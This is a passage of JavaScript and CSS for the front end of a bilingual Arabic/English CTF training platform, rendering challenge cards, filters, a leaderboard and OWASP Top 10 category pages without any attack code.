          background: linear-gradient(135deg, rgba(0,245,160,0.1) 0%, rgba(0,217,245,0.1) 100%);
          border-bottom: 1px solid rgba(255,255,255,0.05);
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
        }
        .challenge-icon {
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.5rem;
          background: linear-gradient(135deg, #00f5a0 0%, #00d9f5 100%);
          color: #0f0c29;
        }
        .challenge-difficulty {
          padding: 6px 14px;
          border-radius: 20px;
          font-size: 0.75rem;
          font-weight: 600;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }
        .challenge-difficulty.easy {
          background: rgba(16, 185, 129, 0.2);
          color: #10b981;
          border: 1px solid rgba(16, 185, 129, 0.3);
        }
        .challenge-difficulty.medium {
          background: rgba(245, 158, 11, 0.2);
          color: #f59e0b;
          border: 1px solid rgba(245, 158, 11, 0.3);
        }
        .challenge-difficulty.hard {
          background: rgba(239, 68, 68, 0.2);
          color: #ef4444;
          border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .challenge-body {
          padding: 24px;
          flex: 1;
          display: flex;
          flex-direction: column;
        }
        .challenge-title {
          color: #fff;
          font-size: 1.25rem;
          font-weight: 700;
          margin-bottom: 12px;
        }
        .challenge-desc {
          color: #718096;
          font-size: 0.9rem;
          line-height: 1.6;
          flex: 1;
          margin-bottom: 16px;
        }
        .challenge-tags {
          display: flex;
          gap: 8px;
          flex-wrap: wrap;
          margin-bottom: 16px;
        }
        .challenge-tag {
          background: rgba(255,255,255,0.05);
          color: #a0aec0;
          padding: 4px 12px;
          border-radius: 6px;
          font-size: 0.75rem;
        }
        .challenge-footer {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding-top: 16px;
          border-top: 1px solid rgba(255,255,255,0.05);
        }
        .challenge-meta {
          display: flex;
          gap: 16px;
          color: #718096;
          font-size: 0.85rem;
        }
        .challenge-meta span {
          display: flex;
          align-items: center;
          gap: 6px;
        }
        .challenge-points {
          font-size: 1.1rem;
          font-weight: 700;
          color: #00f5a0;
        }
        .challenge-progress {
          width: 100%;
          height: 4px;
          background: rgba(255,255,255,0.1);
          border-radius: 2px;
          margin-top: 12px;
          overflow: hidden;
        }
        .challenge-progress-bar {
          height: 100%;
          background: linear-gradient(90deg, #00f5a0 0%, #00d9f5 100%);
          border-radius: 2px;
          transition: width 0.3s ease;
        }
        
        /* Leaderboard */
        .leaderboard-card {
          background: linear-gradient(145deg, #1e1e30 0%, #16162a 100%);
          border-radius: 20px;
          border: 1px solid rgba(255,255,255,0.08);
          padding: 24px;
          height: 100%;
        }
        .leaderboard-title {
          color: #fff;
          font-size: 1.25rem;
          font-weight: 700;
          margin-bottom: 20px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .leaderboard-title i {
          color: #f5a623;
        }
        .leaderboard-item {
          display: flex;
          align-items: center;
          padding: 12px;
          border-radius: 12px;
          margin-bottom: 8px;
          background: rgba(255,255,255,0.03);
          transition: all 0.3s ease;
        }
        .leaderboard-item:hover {
          background: rgba(255,255,255,0.08);
        }
        .leaderboard-rank {
          width: 32px;
          height: 32px;
          border-radius: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 700;
          font-size: 0.9rem;
          margin-right: 12px;
        }
        .rank-1 { background: linear-gradient(135deg, #f5a623 0%, #f7931a 100%); color: #000; }
        .rank-2 { background: linear-gradient(135deg, #c0c0c0 0%, #a0a0a0 100%); color: #000; }
        .rank-3 { background: linear-gradient(135deg, #cd7f32 0%, #b87333 100%); color: #000; }
        .rank-other { background: rgba(255,255,255,0.1); color: #718096; }
        .leaderboard-name {
          flex: 1;
          color: #fff;
          font-weight: 500;
        }
        .leaderboard-points {
          color: #00f5a0;
          font-weight: 700;
        }
        
        /* Search and Filters */
        .ctf-filters {
          background: linear-gradient(145deg, #1e1e30 0%, #16162a 100%);
          border-radius: 16px;
          border: 1px solid rgba(255,255,255,0.08);
          padding: 20px;
          margin-bottom: 2rem;
        }
        .ctf-search-input {
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 12px;
          color: #fff;
          padding: 14px 20px;
          width: 100%;
          transition: all 0.3s ease;
        }
        .ctf-search-input:focus {
          outline: none;
          border-color: #00f5a0;
          box-shadow: 0 0 20px rgba(0,245,160,0.2);
        }
        .ctf-search-input::placeholder {
          color: #718096;
        }
        .ctf-select {
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 12px;
          color: #fff;
          padding: 14px 20px;
          cursor: pointer;
          appearance: none;
          background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23718096' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
          background-repeat: no-repeat;
          background-position: right 16px center;
          padding-right: 45px;
        }
        .ctf-select:focus {
          outline: none;
          border-color: #00f5a0;
        }
        .ctf-select option {
          background: #1e1e30;
          color: #fff;
        }
        
        /* Difficulty Stats */
        .difficulty-stats {
          display: flex;
          gap: 16px;
          justify-content: center;
          padding: 16px 0;
          border-top: 1px solid rgba(255,255,255,0.05);
          margin-top: 16px;
        }
        .diff-stat {
          text-align: center;
        }
        .diff-stat-value {
          font-size: 1.5rem;
          font-weight: 700;
        }
        .diff-stat-value.easy { color: #10b981; }
        .diff-stat-value.medium { color: #f59e0b; }
        .diff-stat-value.hard { color: #ef4444; }
        .diff-stat-label {
          font-size: 0.75rem;
          color: #718096;
          text-transform: uppercase;
        }
        
        /* Flip card styles (keeping for OWASP) */
        .flip-card {
          background-color: transparent;
          width: 100%;
          height: 300px;
          perspective: 1000px;
          cursor: pointer;
        }
        .flip-card-inner {
          position: relative;
          width: 100%;
          height: 100%;
          text-align: center;
          transition: transform 0.6s;
          transform-style: preserve-3d;
          box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
          border-radius: 15px;
        }
        .flip-card:hover .flip-card-inner {
          transform: rotateY(180deg);
        }
        .flip-card-front, .flip-card-back {
          position: absolute;
          width: 100%;
          height: 100%;
          -webkit-backface-visibility: hidden;
          backface-visibility: hidden;
          border-radius: 15px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }
        .flip-card-front {
          background: linear-gradient(135deg, #2c3e50, #4ca1af);
          color: white;
        }
        .flip-card-back {
          background-color: #2980b9;
          color: white;
          transform: rotateY(180deg);
        }
        .owasp-icon { font-size: 4rem; margin-bottom: 20px; }
        
        /* Animation */
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-in {
          animation: fadeInUp 0.5s ease forwards;
          opacity: 0;
        }
      </style>
      
      <!-- Hero Section -->
      <div class="ctf-hero text-center">
        <div class="ctf-hero-content">
          <h1 class="ctf-title">
            <i class="fa-solid fa-flag me-3"></i>${txt('تحديات CTF الاحترافية', 'Professional CTF Challenges')}
          </h1>
          <p class="ctf-subtitle">${txt('تدرب على سيناريوهات واقعية في بيئة آمنة. اختبر مهاراتك وتنافس مع أفضل المخترقين الأخلاقيين.', 'Practice realistic scenarios in a safe environment. Test your skills and compete with the best ethical hackers.')}</p>
          
          <div class="row g-4 justify-content-center mb-4">
            <div class="col-6 col-md-3">
              <div class="stat-card-ctf animate-in" style="animation-delay: 0.1s">
                <div class="stat-value green">${allRooms.length}</div>
                <div class="stat-label">${txt('تحديات', 'Challenges')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-ctf animate-in" style="animation-delay: 0.2s">
                <div class="stat-value blue">${totalPoints}</div>
                <div class="stat-label">${txt('نقطة متاحة', 'Points Available')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-ctf animate-in" style="animation-delay: 0.3s">
                <div class="stat-value orange">${Object.keys(categoryIcons).length}</div>
                <div class="stat-label">${txt('فئات', 'Categories')}</div>
              </div>
            </div>
            <div class="col-6 col-md-3">
              <div class="stat-card-ctf animate-in" style="animation-delay: 0.4s">
                <div class="stat-value pink" id="total-points-display">0</div>
                <div class="stat-label">${txt('نقاطك', 'Your Points')}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <!-- Category Pills -->
      <div class="category-pills">
        <button class="category-pill active" onclick="filterCTFByCategory('all')">
          <i class="fa-solid fa-layer-group"></i>
          <span>${txt('الكل', 'All')}</span>
          <span class="count">${allRooms.length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('web')">
          <i class="fa-solid ${categoryIcons.web}"></i>
          <span>Web</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('web')).length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('crypto')">
          <i class="fa-solid ${categoryIcons.crypto}"></i>
          <span>Crypto</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('crypto')).length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('forensics')">
          <i class="fa-solid ${categoryIcons.forensics}"></i>
          <span>Forensics</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('forensics')).length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('osint')">
          <i class="fa-solid ${categoryIcons.osint}"></i>
          <span>OSINT</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('osint')).length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('network')">
          <i class="fa-solid ${categoryIcons.network}"></i>
          <span>Network</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('network')).length}</span>
        </button>
        <button class="category-pill" onclick="filterCTFByCategory('owasp')">
          <i class="fa-solid ${categoryIcons.owasp}"></i>
          <span>OWASP</span>
          <span class="count">${allRooms.filter(r => r.tags?.includes('owasp')).length}</span>
        </button>
      </div>
      
      <!-- Search and Filters -->
      <div class="ctf-filters">
        <div class="row g-3 align-items-center">
          <div class="col-md-6">
            <div class="position-relative">
              <i class="fa-solid fa-search position-absolute" style="left: 16px; top: 50%; transform: translateY(-50%); color: #718096;"></i>
              <input 
                type="text" 
                class="ctf-search-input" 
                id="ctf-search" 
                placeholder="${txt('ابحث عن تحدي...', 'Search for a challenge...')}"
                style="padding-left: 45px;"
                onkeyup="filterCTFRooms()"
              />
            </div>
          </div>
          <div class="col-md-3">
            <select class="ctf-select w-100" id="category-filter" onchange="filterCTFRooms()">
              <option value="all">${txt('جميع الفئات', 'All Categories')}</option>
              <option value="web">🌐 Web</option>
              <option value="crypto">🔐 Crypto</option>
              <option value="forensics">🔍 Forensics</option>
              <option value="osint">🕵️ OSINT</option>
              <option value="network">🌐 Network</option>
              <option value="owasp">🛡️ OWASP</option>
            </select>
          </div>
          <div class="col-md-3">
            <select class="ctf-select w-100" id="difficulty-filter" onchange="filterCTFRooms()">
              <option value="all">${txt('جميع المستويات', 'All Levels')}</option>
              <option value="easy">🟢 ${txt('سهل', 'Easy')}</option>
              <option value="medium">🟡 ${txt('متوسط', 'Medium')}</option>
              <option value="hard">🔴 ${txt('صعب', 'Hard')}</option>
            </select>
          </div>
        </div>
        <div class="difficulty-stats">
          <div class="diff-stat">
            <div class="diff-stat-value easy" id="easy-count">${easyCount}</div>
            <div class="diff-stat-label">${txt('سهل', 'Easy')}</div>
          </div>
          <div class="diff-stat">
            <div class="diff-stat-value medium" id="medium-count">${mediumCount}</div>
            <div class="diff-stat-label">${txt('متوسط', 'Medium')}</div>
          </div>
          <div class="diff-stat">
            <div class="diff-stat-value hard" id="hard-count">${hardCount}</div>
            <div class="diff-stat-label">${txt('صعب', 'Hard')}</div>
          </div>
          <div class="diff-stat">
            <div class="diff-stat-value" style="color: #00d9f5;" id="visible-count">${allRooms.length}</div>
            <div class="diff-stat-label">${txt('معروض', 'Visible')}</div>
          </div>
        </div>
      </div>
      
      <div class="row">
        <!-- Challenges Grid -->
        <div class="col-lg-9">
          <div class="row g-4" id="rooms-grid">
            ${allRooms.map((room, index) => renderEnhancedRoomCard(room, index)).join('')}
          </div>
        </div>
        
        <!-- Sidebar -->
        <div class="col-lg-3">
          <!-- Leaderboard -->
          <div class="leaderboard-card mb-4">
            <div class="leaderboard-title">
              <i class="fa-solid fa-trophy"></i>
              ${txt('المتصدرون', 'Leaderboard')}
            </div>
            ${leaderboard.map(user => `
              <div class="leaderboard-item">
                <div class="leaderboard-rank ${user.rank <= 3 ? 'rank-' + user.rank : 'rank-other'}">${user.rank}</div>
                <div class="leaderboard-name">${user.name}</div>
                <div class="leaderboard-points">${user.points}</div>
              </div>
            `).join('')}
          </div>
          
          <!-- Quick Stats -->
          <div class="leaderboard-card">
            <div class="leaderboard-title">
              <i class="fa-solid fa-chart-simple"></i>
              ${txt('إحصائياتك', 'Your Stats')}
            </div>
            <div class="text-center py-3">
              <div style="width: 120px; height: 120px; margin: 0 auto 16px; position: relative;">
                <svg viewBox="0 0 36 36" style="transform: rotate(-90deg);">
                  <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="3"/>
                  <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="url(#gradient)" stroke-width="3" stroke-dasharray="25, 100"/>
                  <defs>
                    <linearGradient id="gradient">
                      <stop offset="0%" stop-color="#00f5a0"/>
                      <stop offset="100%" stop-color="#00d9f5"/>
                    </linearGradient>
                  </defs>
                </svg>
                <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
                  <div style="font-size: 1.5rem; font-weight: 700; color: #fff;">25%</div>
                  <div style="font-size: 0.7rem; color: #718096;">${txt('مكتمل', 'Complete')}</div>
                </div>
              </div>
              <div class="d-flex justify-content-around text-center">
                <div>
                  <div style="font-size: 1.2rem; font-weight: 700; color: #00f5a0;">0</div>
                  <div style="font-size: 0.75rem; color: #718096;">${txt('محلول', 'Solved')}</div>
                </div>
                <div>
                  <div style="font-size: 1.2rem; font-weight: 700; color: #f5a623;">0</div>
                  <div style="font-size: 0.75rem; color: #718096;">${txt('جاري', 'In Progress')}</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- OWASP View Container (Hidden by default) -->
      <div id="owasp-view" style="display: none;">
        <div class="d-flex justify-content-center gap-3 mb-4">
          <button class="btn btn-lg btn-outline-primary" id="ctf-mode-btn" onclick="switchOwaspMode('ctf')">
            <i class="fa-solid fa-flag"></i> ${txt('تحديات CTF', 'CTF Challenges')}
          </button>
          <button class="btn btn-lg btn-outline-success" id="edu-mode-btn" onclick="switchOwaspMode('education')">
            <i class="fa-solid fa-graduation-cap"></i> ${txt('التعليم', 'Education')}
          </button>
        </div>
        <div id="owasp-content"></div>
      </div>
    </div>
  `;
}

// Filter CTF Rooms with search, category, and difficulty
window.filterCTFRooms = function () {
  const searchTerm = document.getElementById('ctf-search')?.value.toLowerCase() || '';
  const category = document.getElementById('category-filter')?.value || 'all';
  const difficulty = document.getElementById('difficulty-filter')?.value || 'all';

  const allCards = document.querySelectorAll('#rooms-grid > div');
  let visibleCount = 0;
  let easyCount = 0, mediumCount = 0, hardCount = 0;

  allCards.forEach(card => {
    const roomData = card.getAttribute('data-room');
    if (!roomData) return;

    try {
      const room = JSON.parse(roomData);
      const matchesSearch = !searchTerm ||
        room.title.toLowerCase().includes(searchTerm) ||
        room.description.toLowerCase().includes(searchTerm);

      const matchesCategory = category === 'all' || room.category === category;
      const matchesDifficulty = difficulty === 'all' || room.difficulty === difficulty;

      if (matchesSearch && matchesCategory && matchesDifficulty) {
        card.style.display = '';
        visibleCount++;

        // Count by difficulty
        if (room.difficulty === 'easy') easyCount++;
        else if (room.difficulty === 'medium') mediumCount++;
        else if (room.difficulty === 'hard') hardCount++;
      } else {
        card.style.display = 'none';
      }
    } catch (e) {
      console.error('Error parsing room data:', e);
    }
  });

  // Update statistics
  document.getElementById('visible-count').textContent = visibleCount;
  document.getElementById('easy-count').textContent = easyCount;
  document.getElementById('medium-count').textContent = mediumCount;
  document.getElementById('hard-count').textContent = hardCount;
};

// Initialize statistics on page load
setTimeout(() => {
  if (document.getElementById('ctf-search')) {
    filterCTFRooms();
  }
}, 100);

function renderOwaspCategories() {
  return `
    <div class="row g-4">
      <!-- A01: Broken Access Control -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('idor')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #cb2d3e, #ef473a);">
              <i class="fa-solid fa-user-lock owasp-icon"></i>
              <h5>Broken Access Control</h5>
              <p>A01:2021</p>
            </div>
            <div class="flip-card-back" style="background: #c0392b;">
              <h5>IDOR & Access Control</h5>
              <p>${txt('تجاوز صلاحيات الوصول', 'Bypass access controls')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A02: Cryptographic Failures -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('crypto-failures')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #f2994a, #f2c94c);">
              <i class="fa-solid fa-key owasp-icon"></i>
              <h5>Cryptographic Failures</h5>
              <p>A02:2021</p>
            </div>
            <div class="flip-card-back" style="background: #e67e22;">
              <h5>Weak Crypto & Secrets</h5>
              <p>${txt('تشفير ضعيف وأسرار مكشوفة', 'Weak encryption & exposed secrets')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A03: Injection (SQLi) -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('sqli')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #11998e, #38ef7d);">
              <i class="fa-solid fa-database owasp-icon"></i>
              <h5>Injection (SQLi)</h5>
              <p>A03:2021</p>
            </div>
            <div class="flip-card-back" style="background: #27ae60;">
              <h5>SQL Injection</h5>
              <p>${txt('حقن أوامر SQL', 'Inject SQL commands')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A03: Injection (XSS) -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('xss')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #8e44ad, #c0392b);">
              <i class="fa-solid fa-code owasp-icon"></i>
              <h5>Injection (XSS)</h5>
              <p>A03:2021</p>
            </div>
            <div class="flip-card-back" style="background: #8e44ad;">
              <h5>Cross-Site Scripting</h5>
              <p>${txt('تنفيذ JavaScript خبيث', 'Execute malicious JavaScript')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A04: Insecure Design -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('insecure-design')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #667eea, #764ba2);">
              <i class="fa-solid fa-brain owasp-icon"></i>
              <h5>Insecure Design</h5>
              <p>A04:2021</p>
            </div>
            <div class="flip-card-back" style="background: #5b4b8a;">
              <h5>Logic Flaws</h5>
              <p>${txt('ثغرات منطقية في التصميم', 'Design logic vulnerabilities')}</p>
              <span class="badge bg-light text-dark">1 ${txt('تحدي', 'Challenge')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A05: Security Misconfiguration -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('misconfiguration')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #f093fb, #f5576c);">
              <i class="fa-solid fa-wrench owasp-icon"></i>
              <h5>Security Misconfiguration</h5>
              <p>A05:2021</p>
            </div>
            <div class="flip-card-back" style="background: #e74c3c;">
              <h5>Config Errors</h5>
              <p>${txt('أخطاء في الإعدادات الأمنية', 'Security configuration errors')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A07: Authentication Failures -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('authentication')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #fa709a, #fee140);">
              <i class="fa-solid fa-shield-halved owasp-icon"></i>
              <h5>Authentication Failures</h5>
              <p>A07:2021</p>
            </div>
            <div class="flip-card-back" style="background: #d35400;">
              <h5>Weak Auth</h5>
              <p>${txt('ضعف في المصادقة', 'Weak authentication')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A08: Software Integrity -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('integrity')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #4facfe, #00f2fe);">
              <i class="fa-solid fa-file-signature owasp-icon"></i>
              <h5>Software Integrity</h5>
              <p>A08:2021</p>
            </div>
            <div class="flip-card-back" style="background: #3498db;">
              <h5>Unsigned Code</h5>
              <p>${txt('كود غير موقع', 'Unsigned code')}</p>
              <span class="badge bg-light text-dark">1 ${txt('تحدي', 'Challenge')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A09: Logging Failures -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('logging')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #43e97b, #38f9d7);">
              <i class="fa-solid fa-file-lines owasp-icon"></i>
              <h5>Logging Failures</h5>
              <p>A09:2021</p>
            </div>
            <div class="flip-card-back" style="background: #16a085;">
              <h5>Log Injection</h5>
              <p>${txt('حقن السجلات', 'Log injection')}</p>
              <span class="badge bg-light text-dark">1 ${txt('تحدي', 'Challenge')}</span>
            </div>
          </div>
        </div>
      </div>

      <!-- A10: SSRF -->
      <div class="col-md-4 col-lg-3">
        <div class="flip-card" onclick="openOwaspCategory('ssrf')">
          <div class="flip-card-inner">
            <div class="flip-card-front" style="background: linear-gradient(135deg, #fa8bff, #2bd2ff, #2bff88);">
              <i class="fa-solid fa-server owasp-icon"></i>
              <h5>SSRF</h5>
              <p>A10:2021</p>
            </div>
            <div class="flip-card-back" style="background: #9b59b6;">
              <h5>Server-Side Request Forgery</h5>
              <p>${txt('تزوير طلبات الخادم', 'Server request forgery')}</p>
              <span class="badge bg-light text-dark">2 ${txt('تحديات', 'Challenges')}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

window.openOwaspCategory = function (tag) {
  const allRooms = getAllRooms();
  const categoryRooms = allRooms.filter(r => {
    if (!r || !r.tags || !Array.isArray(r.tags)) return false;
    return r.tags.includes(tag) && r.tags.includes('owasp');
  });

  const html = `
    <div class="mb-4">
      <button class="btn btn-outline-secondary" onclick="window.location.reload()">
        <i class="fa-solid fa-arrow-left"></i> ${txt('العودة للتصنيفات', 'Back to Categories')}
      </button>
      <h3 class="mt-3 text-white">${tag.toUpperCase()} Challenges</h3>
    </div>
    <div class="row g-4">
      ${categoryRooms.length > 0 ? categoryRooms.map(room => renderRoomCard(room)).join('') : '<div class="col-12"><div class="alert alert-warning">No rooms found for this category. Found ' + allRooms.length + ' total rooms.</div></div>'}
    </div>
  `;

  document.getElementById('owasp-view').innerHTML = html;
  document.getElementById('owasp-view').style.display = 'block';

  // Hide main grid
  const roomsGrid = document.getElementById('rooms-grid');
  if (roomsGrid) roomsGrid.style.display = 'none';

  const navPills = document.querySelector('.nav.nav-pills');
  if (navPills) navPills.style.display = 'none';
};

function renderRoomCard(room) {
  // Safety checks
  if (!room) return '';
  const lang = (typeof currentLang !== 'undefined') ? currentLang : 'ar';
  const title = room.title ? (room.title[lang] || room.title.en || room.title.ar || 'Untitled') : 'Untitled';
  const description = room.description ? (room.description[lang] || room.description.en || room.description.ar || '') : '';

  return `
    <div class="col-md-4 room-item" 
         data-category="${room.tags ? room.tags[0] : 'general'}"
         data-room='${JSON.stringify({ title, description, category: room.tags ? room.tags[0] : 'general', difficulty: room.difficulty || 'easy' })}'
    >
      <div class="room-card" onclick="loadCTFRoom('${room.id}')" style="cursor: pointer;">
        <div class="room-header">
          <span class="difficulty-badge ${room.difficulty || 'easy'}">${room.difficulty || 'easy'}</span>
          <span class="text-muted small"><i class="fa-regular fa-clock"></i> ${room.estimatedTime || '30 min'}</span>
        </div>
        
        <h4 class="room-title">${title}</h4>
        <p class="room-description">${description.substring(0, 100)}${description.length > 100 ? '...' : ''}</p>
        
        <div class="room-tags">
          ${room.tags ? room.tags.slice(0, 3).map(tag => `<span class="tag">#${tag}</span>`).join('') : ''}
        </div>
        
        <div class="room-stats mt-auto">
          <span><i class="fa-solid fa-trophy"></i> ${room.points || 0} pts</span>
          <span class="ms-auto"><i class="fa-solid fa-users"></i> ${room.solveCount || 0}</span>
        </div>
      </div>
    </div>
  `;
}

// Enhanced Room Card for new CTF design
function renderEnhancedRoomCard(room, index) {
  if (!room) return '';
  const lang = (typeof currentLang !== 'undefined') ? currentLang : 'ar';
  const title = room.title ? (room.title[lang] || room.title.en || room.title.ar || 'Untitled') : 'Untitled';
  const description = room.description ? (room.description[lang] || room.description.en || room.description.ar || '') : '';

  // Category icons
  const categoryIcons = {
    web: 'fa-globe',
    crypto: 'fa-lock',
    forensics: 'fa-magnifying-glass',
    osint: 'fa-user-secret',
    network: 'fa-network-wired',
    owasp: 'fa-shield-halved',
    injection: 'fa-syringe',
    default: 'fa-flag'
  };

  const mainTag = room.tags?.[0] || 'default';
  const icon = categoryIcons[mainTag] || categoryIcons.default;

  return `
    <div class="col-md-6 col-lg-4 room-item animate-in" 
         style="animation-delay: ${0.05 * index}s"
         data-category="${room.tags ? room.tags[0] : 'general'}"
         data-room='${JSON.stringify({ title, description, category: room.tags ? room.tags[0] : 'general', difficulty: room.difficulty || 'easy' })}'
    >
      <div class="challenge-card" onclick="loadCTFRoom('${room.id}')">
        <div class="challenge-header">
          <div class="challenge-icon">
            <i class="fa-solid ${icon}"></i>
          </div>
          <span class="challenge-difficulty ${room.difficulty || 'easy'}">${room.difficulty || 'easy'}</span>
        </div>
        <div class="challenge-body">
          <h5 class="challenge-title">${title}</h5>
          <p class="challenge-desc">${description.substring(0, 120)}${description.length > 120 ? '...' : ''}</p>
          <div class="challenge-tags">
            ${room.tags ? room.tags.slice(0, 3).map(tag => `<span class="challenge-tag">#${tag}</span>`).join('') : ''}
          </div>
          <div class="challenge-footer">
            <div class="challenge-meta">
              <span><i class="fa-regular fa-clock"></i> ${room.estimatedTime || '30 min'}</span>
              <span><i class="fa-solid fa-users"></i> ${room.solveCount || 0}</span>
            </div>
            <span class="challenge-points">${room.points || 0} pts</span>
          </div>
          <div class="challenge-progress">
            <div class="challenge-progress-bar" style="width: 0%;"></div>
          </div>
        </div>
      </div>
    </div>
  `;
}

// Filter CTF by Category Pills
window.filterCTFByCategory = function (category) {
  // Update active pill
  document.querySelectorAll('.category-pill').forEach(pill => {
    pill.classList.remove('active');
    if (pill.textContent.toLowerCase().includes(category) ||
      (category === 'all' && pill.textContent.includes('All'))) {
      pill.classList.add('active');
    }
  });

  // Update the category dropdown
  const categoryFilter = document.getElementById('category-filter');
  if (categoryFilter) {
    categoryFilter.value = category;
  }

  // Trigger the filter
  filterCTFRooms();
};

// Global function to load a specific room
window.loadCTFRoom = function (roomId) {
  const content = document.getElementById('content');
  content.innerHTML = pageCTFRoom(roomId);
  window.scrollTo(0, 0);
};

function pageCTFRoom(roomId) {
  const room = getRoomById(roomId);
  if (!room) return `<div class="container mt-4"><div class="alert alert-danger">Room not found</div></div>`;

  // Safety checks for language and data
  const lang = (typeof currentLang !== 'undefined') ? currentLang : 'ar';
  const title = room.title ? (room.title[lang] || room.title.en || room.title.ar || 'Untitled') : 'Untitled';
  const description = room.description ? (room.description[lang] || room.description.en || room.description.ar || '') : '';
  const learningObjectives = room.learningObjectives || [];
  const tasks = room.tasks || [];

  return `
    <div class="container mt-4">
      <!-- Header -->
      <div class="room-view-header">
        <div class="room-view-title">
          <button class="btn btn-sm btn-outline-secondary mb-2" onclick="loadPage('ctf')">
            <i class="fa-solid fa-arrow-left"></i> ${txt('العودة للتحديات', 'Back to Challenges')}
          </button>
          <h2>${title}</h2>
          <div class="room-view-meta">
            <span class="difficulty-badge ${room.difficulty || 'easy'}">${room.difficulty || 'easy'}</span>
            <span><i class="fa-regular fa-clock"></i> ${room.estimatedTime || '30 min'}</span>
            <span><i class="fa-solid fa-trophy"></i> ${room.points || 0} pts</span>
          </div>
        </div>
        <div class="room-actions">
          ${room.vulnerableApp ? `
            <button class="btn btn-success btn-lg shadow-sm" onclick="deployMachine('${room.vulnerableApp.path}')">
              <i class="fa-solid fa-power-off"></i> ${txt('تشغيل الجهاز', 'Start Machine')}
            </button>
          ` : ''}
        </div>
      </div>

      <div class="row">
        <!-- Left Column: Tasks -->
        <div class="col-lg-7">
          <div class="card shadow-sm border-0 mb-4">
            <div class="card-body">
              <h4 class="mb-3 fw-bold"><i class="fa-solid fa-circle-info text-primary"></i> ${txt('الوصف', 'Description')}</h4>
              <p class="text-muted">${description}</p>
              
              ${learningObjectives.length > 0 ? `
                <h5 class="mt-4 mb-3 fw-bold">${txt('أهداف التعلم', 'Learning Objectives')}</h5>
